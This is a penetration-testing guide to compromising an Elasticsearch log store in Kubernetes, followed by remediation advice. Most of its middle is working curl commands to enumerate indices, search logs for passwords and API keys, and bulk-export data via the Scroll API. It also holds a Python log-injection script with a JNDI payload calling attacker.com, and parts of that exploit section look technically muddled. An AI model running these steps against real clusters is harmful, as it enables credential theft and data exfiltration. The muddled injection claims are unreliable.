# Kubernetes Penetration Testing: Log Aggregation System Compromise

## 1. Overview Section

### Attack Vector Description

An attacker compromising the log aggregation system (e.g., Elasticsearch, Fluentd, Loki) in a Kubernetes cluster can gain access to sensitive information contained within the logs. This access can be achieved through various means, including:

*   **Compromised Credentials:** Obtaining credentials (usernames/passwords, API keys, certificates) used by the log aggregation system or applications logging to it. This can be through password reuse, credential stuffing, brute-forcing weak credentials, or exploiting application vulnerabilities that expose credentials.
*   **Vulnerable Software:** Exploiting known or zero-day vulnerabilities in the log aggregation software itself (e.g., Elasticsearch RCE vulnerabilities, unpatched vulnerabilities in Fluentd plugins).
*   **Misconfigurations:** Exploiting misconfigurations within the log aggregation system, such as allowing anonymous access, default credentials, insecure network configurations, or permissive roles.
*   **Network Access Control Bypass:** Bypassing network segmentation or firewalls to gain unauthorized access to the log aggregation system.
*   **Poisoning Logs:** Injects malicious code into the logs that when processed by log management software, executes on the system, allowing arbitrary code execution.

### Potential Impact and Consequences

*   **Data Breach:** Exposure of sensitive data contained within the logs, such as API keys, database credentials, Personally Identifiable Information (PII), session tokens, and internal network information.
*   **Lateral Movement:** Using compromised credentials or exposed network information to move laterally within the Kubernetes cluster and the wider network.
*   **Privilege Escalation:** Discovering credentials or vulnerabilities that can be used to escalate privileges within the Kubernetes cluster.
*   **Service Disruption:** Manipulating logs or overloading the log aggregation system to cause denial-of-service (DoS) attacks.
*   **Compliance Violations:** Failure to comply with regulatory requirements due to the exposure of sensitive data.
*   **Tampering with Logs:** Modifying logs to hide malicious activity, cover up tracks, or frame others.
*   **Arbitrary Code Execution:** Depending on the log aggregation system and its configuration, an attacker may be able to execute arbitrary code through log poisoning or other vulnerabilities.

### Risk Level Assessment

**Critical** (if sensitive information is exposed, lateral movement is possible, or remote code execution is achieved).

### Technical Explanation

The vulnerability exists because log aggregation systems often contain sensitive data from various applications and services within a Kubernetes cluster. If the security of the log aggregation system is compromised, this data becomes accessible to an attacker. The root cause is often a combination of weak security practices, misconfigurations, and unpatched software vulnerabilities. Additionally, the trust model of ingesting logs from many sources often leads to a large attack surface.

### Prerequisites and Conditions Needed

*   Network access to the log aggregation system.
*   Valid (or compromised) credentials for the log aggregation system or applications that log to it.
*   Knowledge of the log aggregation system's configuration and capabilities.
*   Vulnerable versions of the log aggregation software or its components (e.g., plugins).
*   Ability to inject logs into the system (e.g., by compromising a pod that sends logs).

## 2. Validation and Exploitation Steps Section

This scenario assumes an Elasticsearch instance is used for log aggregation and that the attacker has already identified it as the target.

**Phase 1: Validation and Reconnaissance**

**Step 1: Check Elasticsearch Status (Anonymous Access)**

```bash
curl -XGET 'http://<elasticsearch_ip>:9200/_cat/health?v'
```

*   **Explanation:** This command attempts to retrieve the health status of the Elasticsearch cluster without authentication.
*   **Why:** To determine if anonymous access is enabled, which is a common misconfiguration.
*   **Expected Output:** If anonymous access is enabled, the command will return information about the cluster's health (cluster name, status, number of nodes, etc.). If authentication is required, it will return an authentication error (e.g., "Unauthorized").
*   **Contribution:** Confirms whether anonymous access is allowed, indicating a significant vulnerability.
*   **Alternative:** Use a browser to navigate to `http://<elasticsearch_ip>:9200` and see if it displays the cluster information.

**Step 2: Check Elasticsearch Status (With Authentication)**

```bash
curl -XGET 'http://<elasticsearch_ip>:9200/_cat/health?v' -u 'elastic:<password>'
```

*   **Explanation:** This command attempts to retrieve the health status of the Elasticsearch cluster using provided credentials.  Replace `<password>` with the assumed or discovered password.
*   **Why:** If the previous step failed, this tries to authenticate using known or guessed credentials.
*   **Expected Output:** If authentication is successful, the command will return information about the cluster's health (cluster name, status, number of nodes, etc.). If authentication fails, it will return an authentication error.
*   **Contribution:** Confirms if the credentials are valid.
*   **Alternative:** Use a tool like `elasticsearch-cli` if available.

**Step 3: Enumerate Indices**

```bash
curl -XGET 'http://<elasticsearch_ip>:9200/_cat/indices?v' -u 'elastic:<password>'
```

*   **Explanation:** This command lists all indices in the Elasticsearch cluster.
*   **Why:** To identify potentially sensitive indices containing valuable data.
*   **Expected Output:** A table listing the indices, their health, status, and document count.
*   **Contribution:** Provides a list of accessible data stores, allowing the attacker to target specific areas.
*   **Alternative:** `curl -XGET 'http://<elasticsearch_ip>:9200/_aliases?pretty'`

**Step 4: Inspect Index Mappings**

```bash
curl -XGET 'http://<elasticsearch_ip>:9200/<index_name>/_mapping?pretty' -u 'elastic:<password>'
```

*   **Explanation:** This command retrieves the mapping for a specific index (replace `<index_name>` with an actual index name from the previous step).
*   **Why:** To understand the structure of the index and identify fields that might contain sensitive data. The `pretty` option formats the JSON output for readability.
*   **Expected Output:** A JSON document describing the index's fields, data types, and analyzers.
*   **Contribution:** Provides insight into the data stored in the index, helping to prioritize targets.
*   **Alternative:** Use the `kibana` interface (if available and accessible) to browse the mappings.

**Phase 2: Exploitation and Data Exfiltration**

**Step 5: Query for Sensitive Data**

```bash
curl -XGET 'http://<elasticsearch_ip>:9200/<index_name>/_search?pretty' -H 'Content-Type: application/json' -d '{
  "query": {
    "query_string": {
      "query": "password OR api_key OR secret"
    }
  }
}' -u 'elastic:<password>'
```

*   **Explanation:** This command performs a search within the specified index for documents containing keywords associated with sensitive data. The `-H 'Content-Type: application/json'` header is important for sending the query correctly.
*   **Why:** To directly extract credentials, API keys, and other sensitive information.
*   **Expected Output:** JSON documents matching the search criteria, potentially containing sensitive data.
*   **Contribution:** Directly reveals sensitive information stored in the logs.
*   **Alternative:** Construct more sophisticated queries using Elasticsearch's query DSL to target specific fields or data patterns. Example:

```bash
curl -XGET 'http://<elasticsearch_ip>:9200/<index_name>/_search?pretty' -H 'Content-Type: application/json' -d '{
  "query": {
    "match": {
      "log_message": "password"
    }
  }
}' -u 'elastic:<password>'
```

This will only search in field called `log_message` for the word password.

**Step 6: Scroll API for Large Data Exports**

If the volume of data is large, use the Scroll API for efficient data extraction:

```bash
# Step 6a: Initial Scroll Request
curl -XGET 'http://<elasticsearch_ip>:9200/<index_name>/_search?scroll=1m&size=1000' -H 'Content-Type: application/json' -d '{
  "query": {
    "match_all": {}
  }
}' -u 'elastic:<password>'

# Step 6b: Extract the scroll_id from the response

# Step 6c: Subsequent Scroll Requests (replace <scroll_id> with the actual ID)
curl -XGET 'http://<elasticsearch_ip>:9200/_scroll?scroll=1m&scroll_id=<scroll_id>' -u 'elastic:<password>'
```

*   **Explanation:** The Scroll API allows retrieving large amounts of data in batches. Step 6a initializes the scroll and returns the first batch and a `scroll_id`. Step 6c uses the `scroll_id` to retrieve subsequent batches until no more data is returned.
*   **Why:** To efficiently exfiltrate large volumes of log data.
*   **Expected Output:**  JSON responses containing batches of documents and the scroll_id to fetch the next batch.  The final response will not include any documents.
*   **Contribution:** Allows extracting the complete log dataset for offline analysis.
*   **Alternative:** Use `jq` or similar tools to parse the JSON responses and extract the relevant data.  Consider scripting this process for automation.

**Phase 3: Post-Exploitation (Example: Log Injection & Possible RCE)**

**Step 7: Injecting Malicious Log Entry**
This step requires the ability to inject logs. It could be done if a pod/application logs to the compromised system.

```python
import logging
import requests

def inject_log(message):
    """Simulates injecting a log message.  In a real scenario, this would be integrated into a compromised application."""
    logging.basicConfig(level=logging.INFO)
    logging.info(message)

def exploit_elasticsearch(log_message):

    index_name = "my_vulnerable_index"  # Replace with the target index
    elastic_url = "http://<elasticsearch_ip>:9200/{}/_doc".format(index_name) # Elasticsearch URL

    payload = {
        "message": log_message
    }

    try:
        response = requests.post(elastic_url, json=payload, auth=('elastic', '<password>')) # Authentication
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        print(f"Log injected successfully. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error injecting log: {e}")

# Example: Log injection payload (Potential RCE via Groovy script execution) - Requires specific configuration, deprecated in later ES versions
#log_payload = '{"type":"log", "message": "{{#mvel code=\"System.getProperty(\\"java.io.tmpdir\\");\"}}", "host":"test.example.com"}'
# Example: Log injection payload (attempt to trigger a vulnerability, might not work without specific plugin installed, such as Logstash)
log_payload = "Attempting to trigger a parsing bug: %{{jndi:ldap://attacker.com/exploit}}%" # Requires JNDI lookup to be allowed which is usually disabled.

exploit_elasticsearch(log_payload)
```

*   **Explanation:**  This Python script simulates injecting a log message into Elasticsearch. The `exploit_elasticsearch` function sends a POST request to the Elasticsearch API to add a new document to the specified index.  The `log_payload` variable contains the malicious log message.  The example shows a potential RCE using MVEL (deprecated in newer versions of ES), and another potential exploit using JNDI lookup.
*   **Why:** To attempt Remote Code Execution (RCE) or trigger other vulnerabilities through carefully crafted log messages.  This depends on Elasticsearch's configuration and enabled plugins.
*   **Expected Output:**
    *   Successful log injection message and a 201 status code from Elasticsearch.
    *   If successful, potentially, the command execution from the Groovy script or JNDI callback will occur on the Elasticsearch server (this is highly dependent on the ES configuration).  You will see evidence of this activity on the attacker's controlled server (e.g., a reverse shell or a DNS query). If it doesn't work, you would need to alter the payload depending on the logging system being used.
*   **Contribution:** Escalates the compromise from data leakage to potential full system control.
*   **Alternative:** Use different payloads depending on the target Elasticsearch version and known vulnerabilities.

**Remediation Recommendations:**

*   **Enable Authentication and Authorization:**  Require strong authentication for all access to the log aggregation system. Use roles-based access control (RBAC) to restrict access to only the necessary data and operations.  Disable anonymous access.
*   **Secure Communication:** Use TLS/SSL to encrypt all communication with the log aggregation system.
*   **Regular Security Audits:** Conduct regular security audits of the log aggregation system and its configuration to identify and address vulnerabilities.
*   **Software Updates:** Keep the log aggregation software and its dependencies up to date with the latest security patches.
*   **Input Validation and Sanitization:** Implement robust input validation and sanitization to prevent log injection attacks.  Limit the types of data that can be logged and enforce strict formatting rules.  Disable features like Groovy scripting or JNDI lookups if they are not required.
*   **Network Segmentation:**  Segment the network to isolate the log aggregation system from other critical infrastructure.
*   **Least Privilege Principle:**  Grant only the minimum necessary privileges to users and applications accessing the log aggregation system.
*   **Monitor Logs:**  Monitor the logs of the log aggregation system for suspicious activity. Implement alerting for unauthorized access attempts, failed authentication attempts, and unusual query patterns.
*   **Data Masking and Redaction:**  Implement data masking and redaction to protect sensitive data in the logs.  Remove or obfuscate sensitive information before it is stored in the log aggregation system.
*   **Secure Kubernetes Configuration:** Review and harden the Kubernetes cluster configuration to prevent unauthorized access to pods and services. Limit the capabilities of pods that log to the aggregation system.
*   **Implement security policies:** Review and implement AppArmor and Seccomp profiles for pods.
*   **Incident Response Plan:** Develop and maintain an incident response plan for responding to a log aggregation system compromise.
